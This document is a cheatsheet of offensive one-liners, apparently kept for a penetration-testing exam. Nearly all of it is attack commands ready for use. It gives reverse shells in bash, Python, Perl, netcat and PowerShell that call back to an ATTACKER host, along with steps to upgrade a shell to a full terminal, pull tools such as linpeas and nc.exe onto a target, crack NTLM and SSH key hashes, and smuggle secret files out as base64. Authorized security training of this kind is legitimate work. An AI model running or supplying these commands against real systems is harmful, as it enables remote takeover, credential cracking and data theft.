# Cheatsheet · One-Liners & Reverse Shells

> Grab-bag of high-frequency commands. Authorized use only.

## Reverse shells (listener: `nc -lvnp 443` or `rlwrap nc -lvnp 443`)
```bash
# bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1
# busybox/sh
sh -i >& /dev/tcp/ATTACKER/443 0>&1
# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
# perl
perl -e 'use Socket;$i="ATTACKER";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# nc (with -e) / mkfifo fallback
nc ATTACKER 443 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 443 >/tmp/f
# powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)}"
```

## Upgrade a dumb shell to a TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# then in the shell:
export TERM=xterm; stty rows 50 cols 200
```

## File transfer
```bash
# attacker serves
python3 -m http.server 80
# target pulls
wget http://ATTACKER/linpeas.sh -O /tmp/l.sh ; curl http://ATTACKER/f -o f
# windows
certutil -urlcache -f http://ATTACKER/nc.exe nc.exe
powershell iwr http://ATTACKER/f -OutFile f
# via SMB
impacket-smbserver share . -smb2support      # then: copy \\ATTACKER\share\f
# scp / over a pivot
scp file user@PIVOT:/tmp/
```

## Cracking
```bash
hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=NT ntlm.txt --wordlist=rockyou.txt
ssh2john id_rsa > j ; john j --wordlist=rockyou.txt
```

## Quick web fuzz
```bash
ffuf -u https://t/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -recursion
```

## Spawn a quick listener with history
```bash
rlwrap nc -lvnp 443
```

## Base64 in/out (exfil small files)
```bash
base64 -w0 secret | tee >(xclip)      # encode on target, paste off
echo BASE64 | base64 -d > secret      # decode on attacker
```

## Stabilize Windows shell / run as another user
```powershell
$p=ConvertTo-SecureString 'Pass' -AsPlainText -Force
$c=New-Object Management.Automation.PSCredential('DOM\user',$p)
Invoke-Command -ComputerName host -Credential $c -ScriptBlock { whoami }
```

> Keep adding your own. A tuned personal one-liner file is worth more than any generic list on exam day.
